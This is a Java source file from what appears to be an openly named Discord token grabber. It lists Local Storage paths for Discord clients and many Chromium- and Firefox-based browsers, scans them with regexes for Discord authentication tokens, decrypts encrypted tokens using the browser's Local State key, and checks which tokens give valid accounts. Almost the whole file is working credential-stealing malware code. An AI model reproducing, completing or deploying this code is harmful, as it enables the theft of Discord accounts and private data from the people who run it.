package com.github.dedinc.discordtokengrabber.utils;

import com.github.dedinc.discordtokengrabber.objects.Account;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Handler {

    private static Pattern tokenRegex = Pattern.compile("[\\w-]{24,30}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    private static Pattern encTokenRegex = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
    private static final HashMap<String, Path> paths = new HashMap<>() {
        {
            put("7Star", Paths.get(System.getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data", "Local Storage", "leveldb"));
            put("360Browser", Paths.get(System.getenv("LOCALAPPDATA"), "360Browser", "Browser", "User Data", "Default", "Local Storage", "leveldb"));
            put("Amigo", Paths.get(System.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Local Storage", "leveldb"));
            put("Brave", Paths.get(System.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"));
            put("CentBrowser", Paths.get(System.getenv("LOCALAPPDATA"), "CentBrowser", "User Data", "Local Storage", "leveldb"));
            put("Chrome Beta", Paths.get(System.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"));
            put("Chrome SxS", Paths.get(System.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb"));
            put("Chrome", Paths.get(System.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"));
            put("CocCoc", Paths.get(System.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data", "Default", "Local Storage", "leveldb"));
            put("Discord Canary", Paths.get(System.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"));
            put("Discord PTB", Paths.get(System.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"));
            put("Discord", Paths.get(System.getenv("APPDATA"), "discord", "Local Storage", "leveldb"));
            put("Epic Privacy Browser", Paths.get(System.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"));
            put("Iridium", Paths.get(System.getenv("LOCALAPPDATA"), "Iridium", "User Data", "Default", "Local Storage", "leveldb"));
            put("Kometa", Paths.get(System.getenv("LOCALAPPDATA"), "Kometa", "User Data", "Local Storage", "leveldb"));
            put("Lightcord", Paths.get(System.getenv("APPDATA"), "Lightcord", "Local Storage", "leveldb"));
            put("Microsoft Edge", Paths.get(System.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"));
            put("Opera GX", Paths.get(System.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"));
            put("Opera", Paths.get(System.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"));
            put("Orbitum", Paths.get(System.getenv("LOCALAPPDATA"), "Orbitum", "User Data", "Local Storage", "leveldb"));
            put("Sputnik", Paths.get(System.getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"));
            put("Torch", Paths.get(System.getenv("LOCALAPPDATA"), "Torch", "User Data", "Local Storage", "leveldb"));
            put("Uran", Paths.get(System.getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"));
            put("Vivaldi", Paths.get(System.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"));
            put("Yandex", Paths.get(System.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"));
        }
    };
    public static final HashMap<String, Path> mozillaPaths = new HashMap<>() {
        {
            put("Mozilla", Paths.get(System.getenv("APPDATA"), "Mozilla", "Firefox"));
            put("Waterfox", Paths.get(System.getenv("APPDATA"), "Waterfox"));
            put("Pale Moon", Paths.get(System.getenv("APPDATA"), "Pale Moon"));
            put("Seamonkey", Paths.get(System.getenv("APPDATA"), "Mozilla", "SeaMonkey"));
        }
    };

    private List<String> tokens = new ArrayList<>();
    private List<Account> accounts = new ArrayList<>();

    public List<Account> getAccounts() {
        crawl();
        Checker checker = new Checker();
        for (String token : tokens) {
            Account account = checker.check(token);
            if (account != null) {
                accounts.add(account);
            }
        }
        return accounts;
    }
    private void crawl() {
        for (Path mozillaPath : mozillaPaths.values()) {
            parseFirefoxProfiles(mozillaPath);
        }
        for (String key : paths.keySet()) {
            File path = paths.get(key).toFile();
            if(!path.exists()) continue;
            if (key.contains("iscord")) {
                crawlEncrypted(path);
            }
            crawlUnencrypted(path);
        }
    }

    public void parseFirefoxProfiles(Path path) {
        if (path.toFile().exists()) {
            try {
                Files.list(Paths.get(path.toFile().getAbsolutePath(), "Profiles"))
                        .limit(100)
                        .forEach(folder -> {
                            if (folder.toFile().getName().endsWith("release")) {
                                try {
                                    Files.list(Paths.get(folder.toFile().getAbsolutePath(), "storage", "default"))
                                            .limit(100)
                                            .forEach(file -> {
                                                if (file.toFile().getName().contains("discord")) {
                                                    paths.put(path.toFile().getName(), Paths.get(file.toFile().getAbsolutePath(), "ls"));
                                                }
                                            });
                                } catch (Exception e) {
                                }
                            }
                        });
            } catch (Exception ignored) {}
        }
    }

    private void crawlEncrypted(File path) {
        try {
            File localState = new File(path.getParentFile().getParentFile(), "Local State");
            byte[] key = Helper.getDecryptor().getKey(localState);
            for (File file : path.listFiles()) {
                for (String encToken: regexFile(encTokenRegex, file)) {
                    String token = Helper.getDecryptor().decrypt(Base64.getDecoder().decode(encToken.replace("dQw4w9WgXcQ:","").getBytes()), key);
                    if (this.tokens.contains(token)) continue;
                    this.tokens.add(token);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private void crawlUnencrypted(File path) {
        for (File file : Objects.requireNonNull(path.listFiles())) {
            for (String token : regexFile(tokenRegex, file)) {
                if (this.tokens.contains(token)) continue;
                this.tokens.add(token);
            }
        }
    }

    private static Vector<String> regexFile(Pattern pattern, File file) {
        Vector<String> result = new Vector<String>();
        try {
            BufferedReader reader = new BufferedReader(new FileReader(file));
            StringBuilder content = new StringBuilder();
            while (reader.ready()) {
                content.append(reader.readLine());
            }
            reader.close();
            Matcher crawler = pattern.matcher(content.toString());
            while (crawler.find() && !result.contains(crawler.group())) {
                result.add(crawler.group());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }
}
